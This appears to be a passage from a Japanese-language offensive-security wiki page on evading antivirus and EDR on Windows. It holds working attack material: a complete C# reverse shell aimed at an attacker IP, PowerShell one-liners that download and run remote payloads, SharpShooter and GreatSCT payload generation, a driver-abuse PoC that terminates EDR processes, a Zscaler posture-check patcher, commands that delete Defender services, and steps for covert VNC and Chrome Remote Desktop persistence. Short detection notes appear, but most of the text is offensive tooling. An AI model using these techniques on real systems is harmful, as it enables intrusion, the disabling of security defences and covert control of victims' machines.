PoCは、XOR keyと、loader-relocated function pointerおよびruntime lengthを含む16-byte recordsを`.funcmeta`に配置します。C fieldは`uint32_t`ですが、handlerはrecord offset `+8`のQWORDにアクセスし、lengthとそのpaddingを消費して、recordsを`0x10`ずつ進めます。PE section namesは8 bytesしかないため、runtime lookupでは`.funcmet`として認識されます。external patcherはexecutable `.stub`を追加し、stubにold entry-point RVAを保存して`AddressOfEntryPoint`をredirectします。PIC stubは`gs:[0x60]` → `[PEB+0x10]`からimage baseを取得し、PE32+ importsを走査して、すでにimportされている`VirtualProtect`をresolveし、CRTより前に実行されます。<sup>[[38]](#references)[[39]](#references)</sup>

Initializationは`gs:[0xE8]`にsentinelを設定し、すべてのmetadata functionsをcallします。常にreadableなprologueはfunction startを`gs:[0xF0]`に記録し、sentinelを検出すると、まだclearなbodyをskipします。続いてepilogueは`call handler`を使用します。handlerが13 registers（`0x68` bytes）をsaveした後、`[rsp+0x68]`のreturn addressはtransformed functionのendであるため、`end - start`をmetadata recordに書き込めます。すべてのbodiesがmaskされた後、stubはsentinelをclearし、`ImageBase + original_entry_point_RVA`へjumpします。<sup>[[38]](#references)[[39]](#references)</sup>

通常のcallでは、prologueが同じsymmetric handlerをcallしてbodyをdecodeします。最終pathは追加されたepilogueへfallし、それより前の各returnはshared handlerへ直接jumpします。通常のepilogueも`call`ではなく`jmp handler`を使用するため、re-masking後にhandlerの`ret`がoriginal callerのreturn addressを消費し、function resultを`RAX`に保持します。<sup>[[38]](#references)[[39]](#references)</sup>

#### Masking primitive and analysis indicators

handlerはcurrent recordを見つけ、固定されたvisible prologue（このbuildでは`0x46` bytes）をskipし、残りを`PAGE_EXECUTE_READWRITE`に変更します。その後、low key byteを使ってbyte-by-byteにXORし、`PAGE_EXECUTE_READ`に戻します。したがって同じloopがentry時にはdecodeし、通常のexit時にはencodeします。<sup>[[38]](#references)[[39]](#references)</sup>

このdesignにおけるhigh-signal indicatorsには、次のものがあります。<sup>[[38]](#references)[[39]](#references)</sup>

- executable `.stub`内にあるentry pointと、keyおよびrelocated `.text` pointersを保持する`.funcmet` section
- pre-CRTでのPEB、import-table、section-tableのparsingと、それに続く各metadata pointer経由のcalls
- 同一の`call`/`pop` PIC prologuesと、1つのhandlerへredirectされた多数のreturn sites
- `gs:[0xE8]`、`gs:[0xF0]`、`gs:[0xF8]`へのwritesに続く、繰り返しの`VirtualProtect` transitionsと、image-backed executable pagesへのbytewise XOR writes

これはcryptographic protectionではなく、memory-scanner evasionです。patched fileにはoriginal clear bodyが残っており、debuggerで`VirtualProtect`またはXOR loopにbreakを設定すれば、active functionをdumpできます。single-byte XOR、readable metadata、固定された`0x46` boundaryによって、offline recoveryも容易です。<sup>[[38]](#references)[[39]](#references)</sup>

> [!WARNING]
> PoCのTEB slotsはthread-localですが、modified code pagesはprocess-wideです。そのため、concurrentまたはrecursive entryによって、別のinvocationが実行中にinstructionsが再度toggleされる可能性があります。また、exceptionsやnonlocal exitsによってre-maskingが回避される場合もあります。堅牢な実装では、transitionsをsynchronizeし、`lpflOldProtect`を通じて実際に返されたprotectionをrestoreし、hard-coded stub lengthsを避け、x64 stack alignmentについて`call`と`jmp`の両方のpathsをauditし、executable bytesを書き換えた後に`FlushInstructionCache`をcallする必要があります。Microsoftは、executable codeが変更された場合のinstruction-cache coherencyについて、callerが責任を負うことを明示しています。<sup>[[38]](#references)[[39]](#references)[[40]](#references)</sup>

## SmartScreen & MoTW

インターネットから一部のexecutablesをdownloadして実行したときに、この画面を見たことがあるかもしれません。

Microsoft Defender SmartScreenは、潜在的にmaliciousなapplicationsの実行からend userを保護するためのsecurity mechanismです。

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

SmartScreenは主にreputation-based approachで動作します。つまり、一般的でないdownload applicationsはSmartScreenをtriggerし、end userにalertを表示してfileの実行を防止します（ただし、More Info -> Run anywayをclickすればfileは実行できます）。

**MoTW** (Mark of The Web)は、Zone.Identifierという名前の[NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)であり、インターネットからのfile download時に、download元のURLとともに自動的に作成されます。

<figure><img src="../images/image (237).png" alt=""><figcaption><p>インターネットからdownloadしたfileのZone.Identifier ADSを確認しています。</p></figcaption></figure>

> [!TIP]
> **trusted** signing certificateで署名されたexecutablesは、**SmartScreenをtriggerしない**ことに注意してください。

payloadsがMark of The Webを取得するのを防ぐ非常に効果的な方法は、ISOのような何らかのcontainer内にpackagingすることです。これは、Mark-of-the-Web (MOTW)を**non NTFS** volumesに適用することが**できない**ためです。

<figure><img src="../images/image (640).png" alt=""><figcaption></figcaption></figure>

[**PackMyPayload**](https://github.com/mgeeky/PackMyPayload/)は、Mark-of-the-Webを回避するためにpayloadsをoutput containersへpackagingするtoolです。

使用例:
```bash
PS C:\Tools\PackMyPayload> python .\PackMyPayload.py .\TotallyLegitApp.exe container.iso

+      o     +              o   +      o     +              o
+             o     +           +             o     +         +
o  +           +        +           o  +           +          o
-_-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-^-_-_-_-_-_-_-_,------,      o
:: PACK MY PAYLOAD (1.1.0)       -_-_-_-_-_-_-|   /\_/\
for all your container cravings   -_-_-_-_-_-~|__( ^ .^)  +    +
-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-_-__-_-_-_-_-_-_-''  ''
+      o         o   +       o       +      o         o   +       o
+      o            +      o    ~   Mariusz Banach / mgeeky    o
o      ~     +           ~          <mb [at] binary-offensive.com>
o           +                         o           +           +

[.] Packaging input file to output .iso (iso)...
Burning file onto ISO:
Adding file: /TotallyLegitApp.exe

[+] Generated file written to (size: 3420160): container.iso
```
これは、[PackMyPayload](https://github.com/mgeeky/PackMyPayload/) を使用してISOファイル内にpayloadをパッケージ化し、SmartScreenをbypassするデモです。

<figure><img src="../images/packmypayload_demo.gif" alt=""><figcaption></figcaption></figure>

## ETW

Event Tracing for Windows (ETW) は、Windowsにおける強力なlogging mechanismであり、アプリケーションやsystem componentsが**イベントをlog**できます。ただし、security productsがmalicious activitiesを監視・検出するためにも使用できます。

AMSIをdisabled（bypass）する方法と同様に、user space processの**`EtwEventWrite`** functionを、イベントをlogせずに即座にreturnするようにすることも可能です。これは、memory内のfunctionをpatchして即座にreturnさせることで実現し、そのprocessにおけるETW loggingを実質的にdisabledにします。

詳細については、**[https://blog.xpnsec.com/hiding-your-dotnet-etw/](https://blog.xpnsec.com/hiding-your-dotnet-etw/) および [https://github.com/repnz/etw-providers-docs/](https://github.com/repnz/etw-providers-docs/)** を参照してください。<sup>[[33]](#references)[[34]](#references)</sup>


## C# Assembly Reflection

C# binariesをmemory内にloadする手法はかなり以前から知られており、AVに検知されずにpost-exploitation toolsを実行する非常に優れた方法です。

payloadはdiskに触れることなくmemoryに直接loadされるため、process全体に対するAMSIのpatchだけを考慮すれば済みます。

ほとんどのC2 frameworks（sliver、Covenant、metasploit、CobaltStrike、Havocなど）は、C# assembliesをmemory内で直接executeする機能をすでに提供していますが、その方法にはいくつかの種類があります。

- **Fork\&Run**

**新しい sacrificial processをspawn**し、その新しいprocessにpost-exploitationのmalicious codeをinjectしてexecuteし、完了したら新しいprocessをkillします。この方法にはメリットとデメリットの両方があります。fork and run methodのメリットは、executionが**Beacon implant processの外部**で行われることです。つまり、post-exploitation actionで問題が発生したり検知されたりしても、**implantが存続する可能性がはるかに高くなります。**デメリットは、**Behavioural Detections**に検知される可能性が**高くなる**ことです。

<figure><img src="../images/image (215).png" alt=""><figcaption></figcaption></figure>

- **Inline**

post-exploitationのmalicious codeを**自身のprocessにinject**する方法です。これにより、新しいprocessを作成してAVにscanされるのを避けられますが、payloadのexecutionで問題が発生するとcrashする可能性があるため、**beaconを失う**可能性が**はるかに高くなる**というデメリットがあります。

<figure><img src="../images/image (1136).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> C# Assembly loadingについてさらに詳しく知りたい場合は、この記事 [https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/](https://securityintelligence.com/posts/net-execution-inlineexecute-assembly/) と、そのInlineExecute-Assembly BOF（[https://github.com/xforcered/InlineExecute-Assembly](https://github.com/xforcered/InlineExecute-Assembly)）を確認してください。

**PowerShellから**C# Assembliesをloadすることもできます。[Invoke-SharpLoader](https://github.com/S3cur3Th1sSh1t/Invoke-SharpLoader) と [S3cur3th1sSh1t's video](https://www.youtube.com/watch?v=oe11Q-3Akuk) を確認してください。

## Other Programming Languagesの使用

[**https://github.com/deeexcee-io/LOI-Bins**](https://github.com/deeexcee-io/LOI-Bins) で提案されているように、**Attacker Controlled SMB shareにインストールされたinterpreter environment**へのaccessをcompromised machineに与えることで、他のlanguagesを使用してmalicious codeをexecuteできます。

SMB share上のInterpreter Binariesとenvironmentへのaccessを許可することで、compromised machineの**memory内でこれらのlanguagesのarbitrary codeをexecute**できます。

repoによると、Defenderは引き続きscriptsをscanしますが、Go、Java、PHPなどを利用することで、**static signaturesをbypassする柔軟性が高まります**。これらのlanguagesでrandomなun-obfuscated reverse shell scriptsを使用したtestingでは、成功が確認されています。

## TokenStomping

Token stompingは、EDRやAVなどのsecurity productのaccess tokenをmanipulateします。tokenのprivilegesを減らすことで、processを実行したまま、privileged inspectionやremediation actionsを実行できないようにできます。

これを防ぐために、Windowsは**external processesがsecurity processesのtokenに対するhandlesを取得すること**を防止できます。

- [**https://github.com/pwn1sher/KillDefender/**](https://github.com/pwn1sher/KillDefender/)
- [**https://github.com/MartinIngesen/TokenStomp**](https://github.com/MartinIngesen/TokenStomp)
- [**https://github.com/nick-frischkorn/TokenStripBOF**](https://github.com/nick-frischkorn/TokenStripBOF)

## Trusted Softwareの使用

### Chrome Remote Desktop

[**this blog post**](https://trustedsec.com/blog/abusing-chrome-remote-desktop-on-red-team-operations-a-practical-guide) で説明されているように、victimのPCにChrome Remote Desktopをdeployし、それを使用してtakeoverとpersistenceの維持を行うのは簡単です。<sup>[[35]](#references)</sup>
1. https://remotedesktop.google.com/ からdownloadし、「Set up via SSH」をクリックしてから、Windows用のMSI fileをクリックしてMSI fileをdownloadします。
2. victim上でinstallerをsilently実行します（adminが必要です）：`msiexec /i chromeremotedesktophost.msi /qn`
3. Chrome Remote Desktop pageに戻り、nextをクリックします。wizardからauthorizeを求められるので、Authorize buttonをクリックして続行します。
4. 必要な調整を加えた上で、提供されたcommandをexecuteします：`"%PROGRAMFILES(X86)%\Google\Chrome Remote Desktop\CurrentVersion\remoting_start_host.exe" --code="YOUR_UNIQUE_CODE" --redirect-url="https://remotedesktop.google.com/_/oauthredirect" --name=%COMPUTERNAME% --pin=111111`（`--pin` parameterはGUIを使用せずにPINを設定します。）


## Advanced Evasion

Evasionは非常に複雑なtopicです。場合によっては、1つのsystem内にあるさまざまなtelemetry sourcesを考慮する必要があるため、成熟したenvironmentで完全にundetectedの状態を維持するのはほぼ不可能です。

対抗するすべてのenvironmentには、それぞれ固有のstrengthsとweaknessesがあります。

Advanced Evasion techniquesの足がかりを得るために、[@ATTL4S](https://twitter.com/DaniLJ94)によるこのtalkをぜひ視聴することを強くお勧めします。


{{#ref}}
https://vimeo.com/502507556?embedded=true&owner=32913914&source=vimeo_logo
{{#endref}}

これは、[@mariuszbit](https://twitter.com/mariuszbit)によるEvasion in Depthに関する、もう1つの素晴らしいtalkです。


{{#ref}}
https://www.youtube.com/watch?v=IbA7Ung39o4
{{#endref}}

## **Old Techniques**

### **Defenderがmaliciousと判定する部分を確認する**

[**ThreatCheck**](https://github.com/rasta-mouse/ThreatCheck) を使用すると、**Defenderがmaliciousと判定している部分を特定して分離する**まで、**binaryの一部を削除**できます。\
同じことを行う別のtoolが[**avred**](https://github.com/dobin/avred)であり、[**https://avred.r00ted.ch/**](https://avred.r00ted.ch/)でopen web serviceとして提供されています。

### **Telnet Server**

Windows10までは、すべてのWindowsに**Telnet server**が付属しており、次の操作で（administratorとして）installできました。
```bash
pkgmgr /iu:"TelnetServer" /quiet
```
システムの起動時に**開始**し、今すぐ**実行**する：
```bash
sc config TlntSVR start= auto obj= localsystem
```
**telnet port を変更**（stealth）し、firewall を無効化：
```
tlntadmn config port=80
netsh advfirewall set allprofiles state off
```
### UltraVNC

次の場所から Download します: [http://www.uvnc.com/downloads/ultravnc.html](http://www.uvnc.com/downloads/ultravnc.html)（setup ではなく、bin downloads が必要です）

**ホスト上で**: _**winvnc.exe**_ を実行し、server を設定します:

- _Disable TrayIcon_ オプションを有効にする
- _VNC Password_ に password を設定する
- _View-Only Password_ に password を設定する

その後、binary の _**winvnc.exe**_ と**新たに**作成されたファイル _**UltraVNC.ini**_ を **victim** 内に移動します

#### **Reverse connection**

**attacker** は自身の **host 内で** binary `vncviewer.exe -listen 5900` を**実行**し、reverse **VNC connection** を受け取れる状態にしておきます。次に、**victim** 内で: winvnc daemon を `winvnc.exe -run` で起動し、`winwnc.exe [-autoreconnect] -connect <attacker_ip>::5900` を実行します

**WARNING:** stealth を維持するには、いくつかの操作を行ってはいけません

- すでに `winvnc` が実行中の場合は起動しないでください。起動すると [popup](https://i.imgur.com/1SROTTl.png) が表示されます。`tasklist | findstr winvnc` で実行中か確認します
- 同じ directory に `UltraVNC.ini` がない状態で `winvnc` を起動しないでください。起動すると [config window](https://i.imgur.com/rfMQWcf.png) が開きます
- help を表示するために `winvnc -h` を実行しないでください。[popup](https://i.imgur.com/oc18wcu.png) が表示されます

### GreatSCT

次の場所から Download します: [https://github.com/GreatSCT/GreatSCT](https://github.com/GreatSCT/GreatSCT)
```
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/setup/
./setup.sh
cd ..
./GreatSCT.py
```
GreatSCTの内部:
```
use 1
list #Listing available payloads
use 9 #rev_tcp.py
set lhost 10.10.14.0
sel lport 4444
generate #payload is the default name
#This will generate a meterpreter xml and a rcc file for msfconsole
```
次に、`msfconsole -r file.rc` で **listener** を起動し、以下の **xml payload** を実行します。
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe payload.xml
```
**現在のDefenderはプロセスを非常に速く終了させます。**

### 独自のreverse shellのコンパイル

https://medium.com/@Bank_Security/undetectable-c-c-reverse-shells-fab4c0ec4f15

#### 最初のC# Revershell

以下を使用してコンパイルします：
```
c:\windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:exe /out:back2.exe C:\Users\Public\Documents\Back1.cs.txt
```
次のように使用します:
```
back.exe <ATTACKER_IP> <PORT>
```

```csharp
// From https://gist.githubusercontent.com/BankSecurity/55faad0d0c4259c623147db79b2a83cc/raw/1b6c32ef6322122a98a1912a794b48788edf6bad/Simple_Rev_Shell.cs
using System;
using System.Text;
using System.IO;
using System.Diagnostics;
using System.ComponentModel;
using System.Linq;
using System.Net;
using System.Net.Sockets;


namespace ConnectBack
{
public class Program
{
static StreamWriter streamWriter;

public static void Main(string[] args)
{
using(TcpClient client = new TcpClient(args[0], System.Convert.ToInt32(args[1])))
{
using(Stream stream = client.GetStream())
{
using(StreamReader rdr = new StreamReader(stream))
{
streamWriter = new StreamWriter(stream);

StringBuilder strInput = new StringBuilder();

Process p = new Process();
p.StartInfo.FileName = "cmd.exe";
p.StartInfo.CreateNoWindow = true;
p.StartInfo.UseShellExecute = false;
p.StartInfo.RedirectStandardOutput = true;
p.StartInfo.RedirectStandardInput = true;
p.StartInfo.RedirectStandardError = true;
p.OutputDataReceived += new DataReceivedEventHandler(CmdOutputDataHandler);
p.Start();
p.BeginOutputReadLine();

while(true)
{
strInput.Append(rdr.ReadLine());
//strInput.Append("\n");
p.StandardInput.WriteLine(strInput);
strInput.Remove(0, strInput.Length);
}
}
}
}
}

private static void CmdOutputDataHandler(object sendingProcess, DataReceivedEventArgs outLine)
{
StringBuilder strOutput = new StringBuilder();

if (!String.IsNullOrEmpty(outLine.Data))
{
try
{
strOutput.Append(outLine.Data);
streamWriter.WriteLine(strOutput);
streamWriter.Flush();
}
catch (Exception err) { }
}
}

}
}
```
### C# compilerを使用
```
C:\Windows\Microsoft.NET\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt.txt REV.shell.txt
```
[REV.txt: https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066](https://gist.github.com/BankSecurity/812060a13e57c815abe21ef04857b066)

[REV.shell: https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639](https://gist.github.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639)

自動ダウンロードと実行:
```csharp
64bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework64\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell

32bit:
powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/812060a13e57c815abe21ef04857b066/raw/81cd8d4b15925735ea32dff1ce5967ec42618edc/REV.txt', '.\REV.txt') }" && powershell -command "& { (New-Object Net.WebClient).DownloadFile('https://gist.githubusercontent.com/BankSecurity/f646cb07f2708b2b3eabea21e05a2639/raw/4137019e70ab93c1f993ce16ecc7d7d07aa2463f/Rev.Shell', '.\Rev.Shell') }" && C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Workflow.Compiler.exe REV.txt Rev.Shell
```
{{#ref}}
https://gist.github.com/BankSecurity/469ac5f9944ed1b8c39129dc0037bb8f
{{#endref}}

C# obfuscators のリスト: [https://github.com/NotPrab/.NET-Obfuscator](https://github.com/NotPrab/.NET-Obfuscator)

### C++
```
sudo apt-get install mingw-w64

i686-w64-mingw32-g++ prometheus.cpp -o prometheus.exe -lws2_32 -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc
```
- [https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp](https://github.com/paranoidninja/ScriptDotSh-MalwareDevelopment/blob/master/prometheus.cpp)
- [https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/](https://astr0baby.wordpress.com/2013/10/17/customizing-custom-meterpreter-loader/)
- [https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Mittal-AMSI-How-Windows-10-Plans-To-Stop-Script-Based-Attacks-And-How-Well-It-Does-It.pdf)
- [https://github.com/l0ss/Grouper2](https://github.com/l0ss/Grouper2)
- [http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html](http://www.labofapenetrationtester.com/2016/05/practical-use-of-javascript-and-com-for-pentesting.html)
- [http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/](http://niiconsulting.com/checkmate/2018/06/bypassing-detection-for-a-reverse-meterpreter-shell/)

### pythonを使用したbuild injectorsの例:

- [https://github.com/cocomelonc/peekaboo](https://github.com/cocomelonc/peekaboo)

### その他のtools
```bash
# Veil Framework:
https://github.com/Veil-Framework/Veil

# Shellter
https://www.shellterproject.com/download/

# Sharpshooter
# https://github.com/mdsecactivebreach/SharpShooter
# Javascript Payload Stageless:
SharpShooter.py --stageless --dotnetver 4 --payload js --output foo --rawscfile ./raw.txt --sandbox 1=contoso,2,3

# Stageless HTA Payload:
SharpShooter.py --stageless --dotnetver 2 --payload hta --output foo --rawscfile ./raw.txt --sandbox 4 --smuggle --template mcafee

# Staged VBS:
SharpShooter.py --payload vbs --delivery both --output foo --web http://www.foo.bar/shellcode.payload --dns bar.foo --shellcode --scfile ./csharpsc.txt --sandbox 1=contoso --smuggle --template mcafee --dotnetver 4

# Donut:
https://github.com/TheWover/donut

# Vulcan
https://github.com/praetorian-code/vulcan
```
### その他

- [https://github.com/Seabreg/Xeexe-TopAntivirusEvasion](https://github.com/Seabreg/Xeexe-TopAntivirusEvasion)

## Bring Your Own Vulnerable Driver (BYOVD) – Kernel Space から AV/EDR を停止する

Storm-2603 は、**Antivirus Terminator** として知られる小規模なコンソールユーティリティを利用し、ransomware を投下する前に endpoint protections を無効化した。この tool は**独自の脆弱だが *signed* な driver**を持ち込み、それを悪用して、Protected-Process-Light (PPL) AV services でもブロックできない特権 kernel operations を実行する。<sup>[[12]](#references)</sup>

主なポイント
1. **Signed driver**: disk に配信される file は `ServiceMouse.sys` だが、binary の正体は Antiy Labs の「System In-Depth Analysis Toolkit」に含まれる、正当に signed された driver `AToolsKrnl64.sys` である。driver は有効な Microsoft signature を保持しているため、Driver-Signature-Enforcement (DSE) が有効でも load される。
2. **Service installation**:
```powershell
sc create ServiceMouse type= kernel binPath= "C:\Windows\System32\drivers\ServiceMouse.sys"
sc start  ServiceMouse
```
1 行目は driver を**kernel service**として登録し、2 行目は driver を起動して、user land から `\\.\ServiceMouse` にアクセスできるようにする。
3. **driver が公開する IOCTLs**
| IOCTL code | Capability                              |
|-----------:|-----------------------------------------|
| `0x99000050` | PID により任意の process を terminate する（Defender/EDR services の kill に使用） |
| `0x990000D0` | disk 上の任意の file を delete する |
| `0x990001D0` | driver を unload し、service を remove する |

最小限の C proof-of-concept:
```c
#include <windows.h>

int main(int argc, char **argv){
DWORD pid = strtoul(argv[1], NULL, 10);
HANDLE hDrv = CreateFileA("\\\\.\\ServiceMouse", GENERIC_READ|GENERIC_WRITE, 0, NULL, OPEN_EXISTING, 0, NULL);
DeviceIoControl(hDrv, 0x99000050, &pid, sizeof(pid), NULL, 0, NULL, NULL);
CloseHandle(hDrv);
return 0;
}
```
4. **動作する理由**:  BYOVD は user-mode protections を完全に回避する。kernel で実行される code は、PPL/PP、ELAM、その他の hardening features に関係なく、*protected* processes を open したり、terminate したり、kernel objects を tamper したりできる。

Detection / Mitigation
•  Microsoft の vulnerable-driver block list（`HVCI`、`Smart App Control`）を有効にし、Windows が `AToolsKrnl64.sys` を load しないようにする。
• 新しい *kernel* services の creation を monitor し、driver が world-writable directory から load された場合、または allow-list に存在しない場合に alert を出す。
• custom device objects に対する user-mode handles と、それに続く suspicious な `DeviceIoControl` calls を監視する。

### On-Disk Binary Patching による Zscaler Client Connector Posture Checks の bypass

Zscaler の **Client Connector** は device-posture rules を locally 適用し、結果を他の components に伝えるために Windows RPC に依存している。2 つの弱い design choices により、完全な bypass が可能になる。

1. Posture evaluation は**完全に client-side** で行われる（boolean が server に送信される）。
2. Internal RPC endpoints は、接続する executable が Zscaler によって **signed** されていること（`WinVerifyTrust` 経由）のみを validate する。<sup>[[11]](#references)</sup>

disk 上の 4 つの signed binaries を **patch** することで、両方の mechanisms を neutralise できる。

| Binary | Original logic patched | Result |
|--------|------------------------|---------|
| `ZSATrayManager.exe` | `devicePostureCheck() → return 0/1` | 常に `1` を return するため、すべての check が compliant になる |
| `ZSAService.exe` | `WinVerifyTrust` への indirect call | NOP 化され、任意の（unsigned であっても）process が RPC pipes に bind できる |
| `ZSATrayHelper.dll` | `verifyZSAServiceFileSignature()` | `mov eax,1 ; ret` に置き換えられる |
| `ZSATunnel.exe` | tunnel の integrity checks | Short-circuited される |

最小限の patcher excerpt:
```python
pattern = bytes.fromhex("44 89 AC 24 80 02 00 00")
replacement = bytes.fromhex("C6 84 24 80 02 00 00 01")  # force result = 1

with open("ZSATrayManager.exe", "r+b") as f:
data = f.read()
off = data.find(pattern)
if off == -1:
print("pattern not found")
else:
f.seek(off)
f.write(replacement)
```
元のファイルを置き換えてサービススタックを再起動すると:

* **すべて**の posture check が **green/compliant** と表示される。
* 署名されていない、または変更されたバイナリが、named-pipe RPC endpoint（例: `\\RPC Control\\ZSATrayManager_talk_to_me`）を開ける。
* 侵害されたホストが、Zscaler のポリシーで定義された内部ネットワークへ無制限にアクセスできるようになる。

このケーススタディは、純粋な client-side の trust decision と単純な signature check が、数バイトの patch だけで突破できることを示している。

## Microsoft Defender `BTR.sys` trusted-functionality abuse

Defender の **Boot-Time Removal** driver は、古典的な BYOVD に対する有用な反例である。`BTR.sys` は、memory-corruption bug も IOCTL interface も存在しない、正規の Microsoft-signed remediation component である。administrator access と `SeLoadDriverPrivilege` を取得した後、operator は代わりに private remediation transaction を偽造し、意図された Ring-0 file/registry operation を実行できる。これは **post-compromise AV/EDR-neutralization primitive であり、initial access や privilege escalation ではない**。また、目立つ third-party driver を持ち込むのではなく、対象の `MpEngine.dll` にある `BOOTTIMETOOL` resource から driver を抽出できる。<sup>[[36]](#references)</sup>

### Staging the one-shot driver

Defender は通常、resource をランダムな `[a-z]{8}.sys` file としてドロップし、同様の名前の kernel service を登録する。`DriverEntry` は service の `Args` value を読み取り、指定された NTFS ADS を開き、action list を復号して検証し、feedback を書き込む。正常に実行された後は `0xC0000056`（`STATUS_DELETE_PENDING`）を返すため、driver は常駐せずに unload される。偽造された service には、以下の特徴的な value が存在する。<sup>[[36]](#references)[[37]](#references)</sup>
```text
Type         = 1
Start        = 1
ErrorControl = 0
ImagePath    = \??\C:\Windows\System32\drivers\<random>.sys
Group        = Boot Bus Extender
Args         = C:\Windows\System32\drivers\<random>.sys:changelist
```
` :changelist` ストリームには、RC4-encrypted blob が1つ含まれます。分析対象のビルドでは固定の256バイトキーが再利用されるため、暗号化は認可境界ではありません。有効な平文には、24バイトのグローバルヘッダー（`Magic=0xFEE1DEAD`、`Version=2`、`PayloadOffset=0x10`、ヘッダーCRC、および payload から導出されたトランザクションID）があり、その後に null-terminated UTF-16 feedback path と、任意の数の item が続きます。各 item には16バイトのヘッダー（`DataSize`、`Action`、`HeaderCRC`、`DataCRC`）と、action 固有のデータがあり、**正確に4個のNUL bytes** で終端します。すべての header/data region は、CRC-32 polynomial `0xEDB88320`、初期状態 `0xFFFFFFFF`、および final XOR なし（`~CRC32`）で個別に検証されます。CRC state は region ごとにリセットされます。<sup>[[36]](#references)[[37]](#references)</sup>

受け付けられる action ID により、これらの kernel primitives が利用可能になります。<sup>[[36]](#references)[[37]](#references)</sup>

| ID | Item data | 結果 |
| --- | --- | --- |
| 1 | `[UTF-16 path]` | locked file を含むファイルを削除 |
| 2 | `[UTF-16 path]` | 空のディレクトリを削除 |
| 3 | `[Flags][source][destination]` | attacker が選択した protected path にファイルを移動。destination が空の場合は削除 |
| 4 | `[Flags][key path]` | registry key を再帰的に削除 |
| 5 | `[Flags][key path + "\\" + value]` | registry value を削除 |
| 6 | `[Flags][type][size][key path + "\\" + value][data]` | registry value を作成または更新し、不足している key path を作成 |

Actions 5 および 6 では、on-wire の key/value separator は**連続する2つのバックスラッシュ**です。慣例的な形式の path は正しく split されません。feedback file は概ね request を反映しますが、各 item の最初の4バイトの data は、その結果である `NTSTATUS` になります。先頭に flags field がない actions 1 および 2 では、BTR はその status 用のスペースを確保するため、path を4つの予約済み trailing bytes に移動します。<sup>[[36]](#references)</sup>

### `BTR_CLI` workflow と early-boot window

[`BTR_CLI`](https://github.com/Dump-GUY/BTR_CLI) は完全な chain を実装します。すなわち、local Defender から `BTR.sys` を抽出し、`<random>.sys:changelist` と feedback stream を作成し、chained actions を serialize/checksum/encrypt し、service registry key を直接作成した後、`-trigger now` の場合は `NtLoadDriver` を呼び出し、`-trigger boot` の場合は system-start driver として残します。registry staging を直接行うことで通常の SCM `CreateServiceW` path を回避するため、service-install Event ID 7045 は**生成されません**。boot-triggered artifacts は、後から `BTR_CLI.exe -cleanup <service_name>` で削除できます。<sup>[[36]](#references)[[37]](#references)</sup>
```powershell
# Runtime: remove protected security-service registrations from Ring 0
BTR_CLI.exe -chain -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WdFilter" -item "4|HKLM\SYSTEM\CurrentControlSet\Services\WinDefend" -trigger now

# Boot: delete a security driver before its user-mode protection stack starts
BTR_CLI.exe -a 1 -s "C:\Windows\System32\drivers\wd\WdFilter.sys" -trigger boot
```
`Start=0` は使用できません。BTR は storage stack と `SystemRoot` link の準備が整う前に、`DriverEntry` から file I/O を実行するためです。`Start=1` と high-priority の `Boot Bus Extender` group を組み合わせると、代わりに Phase 1 で実行されます。この時点では NTFS は使用可能ですが、多くの system-start security drivers と user-mode EDR services はまだ初期化されていません。`WdFilter` などの boot-start filters はすでにロードされている可能性がありますが、BTR は次回の start 前にそれらの binaries または service configuration を削除でき、SCM が起動する前に service executables を削除することもできます。BTR は boot-start evaluation の後に実行され、有効な Microsoft signature を持つため、ELAM でもこの gap は解消されません。<sup>[[36]](#references)</sup>

複数の actions が 1 つの transaction 内で実行されます。PoC は、hard-coded な `\SystemRoot\Temp\BootClean.log` に対する Action 1 を先頭に追加します。BTR はこの log を作成し、自身の delete request を処理して unload 前に削除します。これにより evidence を減らせます。また、feedback を `<random>.sys:<random>.dat` に配置すると、driver と両方の streams をまとめて削除できます。<sup>[[36]](#references)[[37]](#references)</sup>

### High-signal detection correlations

Signature-only rules と Microsoft vulnerable-driver blocklist では、BTR の intended functionality の abuse に対処できません。以下の behavioral correlations を優先し、正規の Defender lineage と任意の launcher を区別してください。<sup>[[36]](#references)</sup>

- **Sysmon 15:** `.sys:changelist` の作成は、BTR staging に常に伴います。同じ `.sys` に付加された `.dat` ADS は特に suspicious です。正規の Defender は通常、`C:\ProgramData\Microsoft\Windows Defender\Scans\RebootActions\` 配下に feedback を配置するためです。
